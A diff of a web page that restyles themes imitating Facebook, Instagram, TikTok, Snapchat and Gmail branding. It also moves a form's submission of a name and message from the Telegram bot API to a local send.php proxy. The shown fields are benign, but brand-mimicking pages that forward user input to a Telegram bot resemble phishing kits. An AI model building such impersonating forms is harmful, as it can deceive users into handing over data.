@@ -14,18 +14,10 @@ button{border:none; color:#fff; font-weight:700; cursor:pointer;}
 small{display:block;margin-top:8px;color:#666;}
 
 /* Platform Themes */
-body.facebook{background:#f0f2f5}
-body.facebook .logo{color:#1877f2} body.facebook button{background:#1877f2}
-
-body.instagram{background:linear-gradient(135deg,#833ab4,#fd1d1d,#fcb045)}
-body.instagram .logo{color:#e1306c} body.instagram button{background:#e1306c}
-
-body.tiktok{background:#000} body.tiktok .box{background:#111;color:#fff}
-body.tiktok input,body.tiktok textarea{background:#222;color:#fff;border:1px solid #333}
-body.tiktok .logo{color:#25f4ee} body.tiktok button{background:#25f4ee;color:#000}
-
+body.facebook{background:#f0f2f5} body.facebook .logo{color:#1877f2} body.facebook button{background:#1877f2}
+body.instagram{background:linear-gradient(135deg,#833ab4,#fd1d1d,#fcb045)} body.instagram .logo{color:#e1306c} body.instagram button{background:#e1306c}
+body.tiktok{background:#000} body.tiktok .box{background:#111;color:#fff} body.tiktok input,body.tiktok textarea{background:#222;color:#fff;border:1px solid #333} body.tiktok .logo{color:#25f4ee} body.tiktok button{background:#25f4ee;color:#000}
 body.snapchat{background:#fffc00} body.snapchat .logo{color:#000} body.snapchat button{background:#000;color:#fffc00}
-
 body.gmail{background:#f2f2f2} body.gmail .logo{color:#d93025} body.gmail button{background:#d93025}
 </style>
 </head>
@@ -75,15 +67,14 @@ async function send(){
 💬 Message: ${msgVal}`;
 
     try{
-        const res = await fetch(`https://api.telegram.org/bot${token}/sendMessage`,{
+        const res = await fetch('send.php',{
             method:"POST",
             headers:{"Content-Type":"application/json"},
-            body: JSON.stringify({ chat_id: chat, text })
+            body: JSON.stringify({token, chat_id: chat, text})
         });
         const data = await res.json();
         if(!data.ok) throw new Error(data.description || "Telegram error");
-        alert("Sent ✅");
-        name.value = ""; msg.value = "";
+        alert("Sent ✅"); name.value=""; msg.value="";
     }catch(e){
         alert("Error ❌ " + e.message);
     }
